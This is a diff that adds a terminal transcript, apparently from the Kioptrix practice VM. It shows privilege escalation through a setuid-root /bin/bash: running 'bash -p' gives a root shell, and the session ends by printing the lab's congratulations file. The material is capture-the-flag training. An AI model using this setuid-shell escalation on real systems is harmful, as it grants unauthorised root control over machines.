@@ -1,0 +1,32 @@
+bash-3.2$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 702160 2008-05-12 14:33 /bin/bash
+bash-3.2$ ls
+checklogin.php  database.sql  images  index.php  john  login_success.php  logout.php  member.php  robert
+bash-3.2$ bash -p
+bash-3.2# ls
+checklogin.php  database.sql  images  index.php  john  login_success.php  logout.php  member.php  robert
+bash-3.2# whoami
+root
+bash-3.2# cd /root/
+bash-3.2# ls
+congrats.txt  lshell-0.9.12
+bash-3.2# cat congrats.txt 
+Congratulations!
+You've got root.
+
+There is more then one way to get root on this system. Try and find them.
+I've only tested two (2) methods, but it doesn't mean there aren't more.
+As always there's an easy way, and a not so easy way to pop this box.
+Look for other methods to get root privileges other than running an exploit.
+
+It took a while to make this. For one it's not as easy as it may look, and
+also work and family life are my priorities. Hobbies are low on my list.
+Really hope you enjoyed this one.
+
+If you haven't already, check out the other VMs available on:
+www.kioptrix.com
+
+Thanks for playing,
+loneferret
+
+bash-3.2# 
